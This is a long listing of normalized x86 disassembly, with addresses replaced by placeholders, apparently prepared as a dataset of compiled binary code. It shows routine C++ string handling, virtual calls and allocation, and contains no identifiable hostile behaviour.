test [ ebp + 0x60 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xe
mov ecx [ ebp + 0x5c ]
mov eax [ ecx ]
push rw-data
lea edx [ ebp - 0x28 ]
push edx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov edi [ ebp + 0x6c ]
cmp [ edi + 0x24 ] esi
je r-xdata
and [ ebp + 0x60 ] 0xfffffffb
push esi
push ebx
lea ecx [ ebp + 0x1c ]
call sub_40415f
push [ ebp + 0x58 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x54 ] eax
mov [ ebp - 0x4 ] 0xf
cmp eax esi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x60 ] 0x10
je r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
add edi 0x10
push edi
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x10
mov edi [ ebp + 0x5c ]
or [ ebp + 0x60 ] 0x10
push eax
push [ ebp + 0x54 ]
xor bl bl
call sub_41ed6b
mov edi [ ebp + 0x6c ]
xor ebx ebx
inc ebx
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x60 ]
call sub_40415f
sub_407ad0
push 0x1b0
mov eax sub_43f945
call sub_425dad
mov esi ecx
xor edi edi
mov [ ebp - 0x14 ] edi
mov eax [ esi ]
call [ eax + 0x68 ]
cmp eax 0x4
je r-xdata
push r--data
lea ecx [ ebp - 0x184 ]
call sub_403dc1
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x4 ] edi
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
xor ebx ebx
push edi
inc ebx
push ebx
lea ecx [ ebp - 0x184 ]
mov esi eax
call sub_40415f
push r--data
lea ecx [ ebp - 0x1bc ]
call sub_403dc1
lea ecx [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push edi
push ebx
lea ecx [ ebp - 0x1bc ]
mov esi eax
call sub_40415f
mov eax [ esi ]
mov ecx esi
call [ eax + 0x2c ]
mov esi [ ebp + 0x8 ]
push eax
lea edi [ esi + 0x10 ]
call sub_4145f0
test [ esi + 0x48c ] 0x2
mov [ esi + 0x488 ] bl
je r-xdata
cmp eax 0x8
jne r-xdata
mov eax esi
call sub_4089a2
push esi
call sub_407ea4
jmp r-xdata
call sub_425e4c
retn 0x4
mov edi r--data
push edi
lea ecx [ ebp - 0x1a0 ]
call sub_403dc1
lea ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
xor ebx ebx
push 0x0
inc ebx
push ebx
lea ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x18 ] eax
call sub_40415f
push r--data
lea ecx [ ebp - 0x34 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x3
push r--data
lea ecx [ ebp - 0xc0 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov [ ebp - 0x4 ] 0x4
push edi
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x14 ] 0x3
call sub_403dc1
lea ecx [ ebp - 0x34 ]
push ecx
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
mov [ ebp - 0x14 ] 0x7
call [ eax + 0x50 ]
test al al
je r-xdata
mov [ ebp - 0xd ] 0x0
push r--data
lea ecx [ ebp - 0x88 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x6
push r--data
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x14 ] 0xf
call sub_403dc1
mov ecx [ ebp - 0x18 ]
push rw-data
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x4 ] 0x7
mov eax [ ecx ]
lea edx [ ebp - 0x168 ]
push edx
mov [ ebp - 0x14 ] 0x1f
call [ eax + 0x50 ]
mov [ ebp - 0xd ] bl
test al al
jne r-xdata
test [ ebp - 0x14 ] 0x8
je r-xdata
and [ ebp - 0x14 ] 0xffffffef
push 0x0
push ebx
lea ecx [ ebp - 0x168 ]
call sub_40415f
test [ ebp - 0x14 ] 0x10
je r-xdata
test [ ebp - 0x14 ] 0x4
je r-xdata
and [ ebp - 0x14 ] 0xfffffff7
push 0x0
push ebx
lea ecx [ ebp - 0x88 ]
call sub_40415f
test [ ebp - 0x14 ] 0x2
je r-xdata
and [ ebp - 0x14 ] 0xfffffffb
push 0x0
push ebx
lea ecx [ ebp - 0x130 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x14 ] bl
je r-xdata
and [ ebp - 0x14 ] 0xfffffffd
push 0x0
push ebx
lea ecx [ ebp - 0xc0 ]
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x34 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x6c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
push edi
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
lea ecx [ ebp - 0x6c ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0xa
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xd ] al
call sub_40415f
push esi
push ebx
lea ecx [ ebp - 0x50 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0x6c ]
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
push ebx
jmp r-xdata
push esi
mov edi r--data
push edi
lea ecx [ ebp - 0xdc ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0xb
call sub_403dc1
mov esi [ ebp - 0x18 ]
push rw-data
lea ecx [ ebp - 0xdc ]
push ecx
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0xc
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
push 0x0
push ebx
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push ebx
lea ecx [ ebp - 0xdc ]
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov ebx [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x14c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x14c ]
push ecx
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xe
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x50 ]
xor esi esi
push esi
push ebx
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0xd ] al
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push esi
push ebx
lea ecx [ ebp - 0x14c ]
call sub_40415f
cmp [ ebp - 0xd ] 0x0
mov ebx [ ebp + 0x8 ]
je r-xdata
push 0x2
jmp r-xdata
push esi
jmp r-xdata
push 0x3
jmp r-xdata
call sub_40dd51
jmp r-xdata
sub_407ea4
push 0x98
mov eax sub_43c4bb
call sub_425dad
mov ebx [ ebp + 0x8 ]
xor edi edi
push 0x6
mov [ ebp - 0x10 ] edi
call sub_40de03
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
push 0x2
mov [ ebp - 0x4 ] edi
pop ebx
cmp eax edi
je r-xdata
xor esi esi
inc esi
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
xor esi esi
mov [ ebp - 0x4 ] 0x1
inc esi
push r--data
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x10 ] esi
call sub_403dc1
push edi
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x84 ]
mov [ ebp - 0x4 ] ebx
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
call sub_41ec78
mov edi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push 0x0
push esi
lea ecx [ ebp - 0x84 ]
call sub_40415f
test [ ebp - 0x10 ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x30 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x5
call sub_403dc1
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x6
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push 0x0
push esi
lea ecx [ ebp - 0x4c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
mov ebx r--data
push ebx
lea ecx [ ebp - 0x4c ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
push 0x0
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x4c ]
call sub_40415f
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x9
test eax eax
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push 0x0
push esi
lea ecx [ ebp - 0x68 ]
call sub_40415f
xor ebx ebx
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xa
or [ ebp - 0x10 ] 0x4
push ebx
lea ecx [ ebp - 0x30 ]
call sub_403dc1
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0xb
or [ ebp - 0x10 ] 0x8
push eax
push [ ebp - 0x14 ]
xor bl bl
call sub_41ed6b
xor esi esi
mov ebx eax
inc esi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x4
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
push 0x0
push esi
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0xa0 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0xe
mov eax [ ebx ]
push ecx
mov ecx ebx
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0xa0 ]
call sub_40415f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push edi
call [ eax + 0x14 ]
call sub_425e4c
retn 0x4
push 0x0
push esi
lea ecx [ ebp - 0x4c ]
call sub_40415f
sub_4080c7
push 0x1d0
mov eax sub_43f836
call sub_425dad
mov esi ecx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ esi ]
call [ eax + 0x68 ]
cmp eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_4089a2
cmp eax 0x8
jne r-xdata
call sub_425e4c
retn 0x4
mov edi r--data
push edi
lea ecx [ ebp - 0x1bc ]
call sub_403dc1
lea ecx [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
inc ebx
push ebx
lea ecx [ ebp - 0x1bc ]
mov [ ebp - 0x18 ] eax
call sub_40415f
push r--data
lea ecx [ ebp - 0xdc ]
call sub_403dc1
mov [ ebp - 0x4 ] ebx
push r--data
lea ecx [ ebp - 0x14c ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
push 0x3
pop ebx
mov [ ebp - 0x4 ] 0x2
push edi
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
push 0x7
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
pop ebx
lea ecx [ ebp - 0xdc ]
push ecx
lea ecx [ ebp - 0x14c ]
push ecx
lea ecx [ ebp - 0xa4 ]
push ecx
mov ecx esi
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
test al al
je r-xdata
mov [ ebp - 0xd ] 0x0
push r--data
lea ecx [ ebp - 0x184 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x4
push r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x14 ] 0xf
call sub_403dc1
mov ecx [ ebp - 0x18 ]
push 0x1f
pop ebx
push rw-data
lea edx [ ebp - 0x184 ]
push edx
mov [ ebp - 0x4 ] 0x5
mov eax [ ecx ]
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
test bl 0x8
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x6c ]
and ebx 0xffffffef
call sub_40415f
test bl 0x10
je r-xdata
test bl 0x4
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x184 ]
and ebx 0xfffffff7
call sub_40415f
test bl 0x2
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0xa4 ]
and ebx 0xfffffffb
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x14c ]
and ebx 0xfffffffd
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0xdc ]
and ebx 0xfffffffe
call sub_40415f
push r--data
lea ecx [ ebp - 0xc0 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x6
or ebx 0x20
push r--data
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
or ebx 0x40
push edi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0x88 ]
push ecx
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x8
mov eax [ esi ]
push ecx
or ebx 0x80
mov ecx esi
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
test al al
je r-xdata
push 0x1
jmp r-xdata
mov [ ebp - 0xd ] 0x0
push r--data
lea ecx [ ebp - 0x114 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x9
or ebx 0x100
push r--data
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov ecx [ ebp - 0x18 ]
push rw-data
lea edx [ ebp - 0x114 ]
push edx
mov [ ebp - 0x4 ] 0xa
mov eax [ ecx ]
lea edx [ ebp - 0x34 ]
or ebx 0x200
push edx
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
mov ebx [ ebp + 0x8 ]
jmp r-xdata
test ebx 0x100
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x34 ]
and ebx 0xfffffdff
call sub_40415f
test ebx 0x200
je r-xdata
call sub_40ddaa
jmp r-xdata
test bl bl
jns r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x114 ]
and ebx 0xfffffeff
call sub_40415f
test bl 0x40
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x50 ]
and ebx 0xffffff7f
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test bl 0x20
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x88 ]
and ebx 0xffffffbf
call sub_40415f
cmp [ ebp - 0xd ] 0x0
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0xc0 ]
and ebx 0xffffffdf
call sub_40415f
push r--data
lea ecx [ ebp - 0x1d8 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
or ebx 0x400
push r--data
lea ecx [ ebp - 0x1a0 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov [ ebp - 0x4 ] 0xc
or ebx 0x800
push edi
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
lea ecx [ ebp - 0x1d8 ]
push ecx
lea ecx [ ebp - 0x1a0 ]
push ecx
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0xd
mov eax [ esi ]
push ecx
or ebx 0x1000
mov ecx esi
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
mov edi 0x2000
mov esi 0x4000
test al al
je r-xdata
push 0x2
mov [ ebp - 0xd ] 0x0
push r--data
lea ecx [ ebp - 0x130 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0xe
or ebx edi
push r--data
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x14 ] ebx
call sub_403dc1
mov ecx [ ebp - 0x18 ]
push rw-data
lea edx [ ebp - 0x130 ]
push edx
mov [ ebp - 0x4 ] 0xf
mov eax [ ecx ]
lea edx [ ebp - 0xf8 ]
or ebx esi
push edx
mov [ ebp - 0x14 ] ebx
call [ eax + 0x50 ]
mov [ ebp - 0xd ] 0x1
test al al
jne r-xdata
xor esi esi
xor esi esi
push esi
push 0x1
lea ecx [ ebp - 0xf8 ]
and ebx 0xffffbfff
call sub_40415f
jmp r-xdata
test esi ebx
je r-xdata
test ebx 0x1000
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x130 ]
and ebx 0xffffdfff
call sub_40415f
test edi ebx
je r-xdata
test ebx 0x800
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x168 ]
and ebx 0xffffefff
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
test ebx 0x400
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x1a0 ]
and ebx 0xfffff7ff
call sub_40415f
cmp [ ebp - 0xd ] 0x0
mov ebx [ ebp + 0x8 ]
je r-xdata
push esi
push 0x1
lea ecx [ ebp - 0x1d8 ]
call sub_40415f
push esi
push 0x3
jmp r-xdata
sub_408562
push 0x78
mov eax sub_43c3f7
call sub_425dad
mov edi 0x80
xor ebx ebx
push edi
mov [ ebp - 0x10 ] ebx
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] 0x1
call sub_403dc1
push ebx
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x10 ] 0x3
call sub_41ec78
mov esi eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
push edi
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp - 0x4c ]
call sub_40415f
test [ ebp - 0x10 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
or [ ebp - 0x10 ] 0x4
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push 0x8
pop eax
mov [ ebp - 0x4 ] eax
or [ ebp - 0x10 ] eax
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
push [ ebp - 0x14 ]
xor bl bl
mov edi esi
call sub_41ed6b
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x4
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
push ebx
push 0x1
lea ecx [ ebp - 0x68 ]
call sub_40415f
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
call [ eax + 0x14 ]
call sub_425e4c
retn 0x4
push ebx
push 0x1
lea ecx [ ebp - 0x84 ]
call sub_40415f
sub_4086ce
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push esi
push edi
mov edi eax
mov eax [ edi + 0x460 ]
mov eax [ eax ]
add edi 0x44c
mov [ esp + 0xc ] eax
mov eax [ edi ]
mov [ esp + 0x8 ] eax
call sub_423d5c
cmp [ esp + 0x8 ] eax
je r-xdata
mov esi edi
call sub_408d2b
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea esi [ esp + 0x8 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ esp + 0xc ] esi
je r-xdata
lea esi [ esp + 0x8 ]
call sub_408d54
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
cmp [ esp + 0x8 ] 0x0
mov esi [ edi + 0x14 ]
mov eax [ edi ]
je r-xdata
sub_40873c
push 0x4
mov eax sub_43f4b1
call sub_425dad
cmp [ esi + 0x448 ] 0x0
jne r-xdata
mov ecx [ esi + 0x448 ]
lea eax [ esi + 0x218 ]
push eax
call sub_4170dc
call sub_425e4c
retn
push 0x24
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push esi
push eax
call sub_417027
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ esi + 0x448 ] eax
sub_408791
push 0x194
mov eax sub_43eb4c
call sub_425e16
xor ebx ebx
mov esi ecx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xc8 ] esi
cmp [ esi + 0x468 ] ebx
je r-xdata
call sub_425e60
retn
mov eax esi
call sub_40d125
cmp eax 0x2
jl r-xdata
lea edi [ ebp - 0xb8 ]
call sub_404957
push r--data
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
lea eax [ ebp - 0xe4 ]
push eax
inc ebx
mov [ ebp - 0x4 ] bl
push [ esi + 0x468 ]
lea eax [ esi + 0x46c ]
push eax
mov eax edi
push eax
call sub_41e32b
add esp 0x10
push 0x0
push ebx
lea ecx [ ebp - 0xe4 ]
mov edi eax
mov [ ebp - 0x4 ] 0x0
call sub_40415f
lea eax [ ebp - 0x1a0 ]
push eax
call sub_408d83
mov [ ebp - 0x4 ] 0x2
push [ esi + 0x490 ]
lea eax [ ebp - 0x1a0 ]
push eax
call sub_408a3e
push 0x80
call sub_4246c6
pop ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0x4 ] 0x3
test eax eax
je r-xdata
test [ ebp - 0xbc ] 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0x100 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0x11c ]
lea eax [ ebp - 0x1a0 ]
mov [ ebp - 0xbc ] ebx
call sub_408e2c
push eax
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x5
push eax
push [ ebp - 0xc0 ]
xor bl bl
mov [ ebp - 0xbc ] 0x3
call sub_41ed6b
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0xbc ] bl
je r-xdata
and [ ebp - 0xbc ] 0xfffffffd
push 0x0
push ebx
lea ecx [ ebp - 0x11c ]
call sub_40415f
mov eax [ esi + 0x460 ]
mov eax [ eax ]
mov ecx [ esi + 0x44c ]
mov [ ebp - 0xc4 ] ecx
mov [ ebp - 0xc0 ] eax
push 0x0
push ebx
lea ecx [ ebp - 0x100 ]
call sub_40415f
call sub_423d5c
cmp [ ebp - 0xc4 ] eax
je r-xdata
mov eax [ esi ]
push edi
mov ecx esi
call [ eax + 0x14 ]
lea eax [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0x0
call sub_408986
lea esi [ ebp - 0xb8 ]
call sub_4011ad
lea esi [ ebp - 0xc4 ]
call sub_40f2a9
mov ecx [ eax ]
mov esi [ edi ]
mov eax [ ecx ]
add esi 0x18
call [ eax + 0x4 ]
push eax
mov ecx edi
call [ esi ]
lea esi [ ebp - 0xc4 ]
call sub_408d54
mov esi [ ebp - 0xc8 ]
jmp r-xdata
cmp [ ebp - 0xc0 ] ebx
je r-xdata
cmp [ ebp - 0xc4 ] 0x0
mov ebx [ esi + 0x460 ]
mov eax [ esi + 0x44c ]
je r-xdata
sub_4089a2
push ebx
mov ebx eax
cmp [ ebx + 0x237 ] 0x0
je r-xdata
push 0x8
call sub_40de03
call sub_40dc0d
pop ebx
retn
cmp [ ebx + 0x48a ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx ebx
pop ebx
jmp [ eax + 0x28 ]
push 0x7
call sub_40de03
push [ ebx + 0x444 ]
call sub_41a3a4
pop ebx
retn
sub_4089e1
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
mov ebx ecx
call sub_408791
push 0x8
call sub_40de03
call sub_40dc0d
pop ebx
mov esp ebp
pop ebp
retn
sub_408a3e
push 0x24
mov eax sub_43e541
call sub_425de0
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x28 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_4094e6
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x24 ] bl
je r-xdata
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
lea esi [ ebp - 0x1c ]
call sub_406595
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40a7d3
pop ecx
lea ecx [ ebp - 0x1c ]
mov esi eax
call sub_4061b7
mov ecx [ edi ]
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
add ecx edi
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x30 ] bl
mov cl [ ecx + 0x30 ]
mov [ ebp - 0x20 ] cl
push [ ebp - 0x20 ]
add eax edi
push eax
push edx
push [ ebp - 0x30 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ esi ]
mov ecx esi
call [ eax + 0x1c ]
cmp [ ebp - 0x30 ] bl
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x28 ]
push eax
call sub_409545
mov eax edi
call sub_425e4c
retn 0x8
push ebx
push [ ebp - 0x18 ]
call sub_408b69
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
sub_408ace
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_406490
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_408b2a
push ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop ecx
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_408b69
sub_408b8a
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_423097
mov ecx edi
call sub_4061b7
push edi
call sub_42412e
pop ecx
sub_408bbd
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_408bf4
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
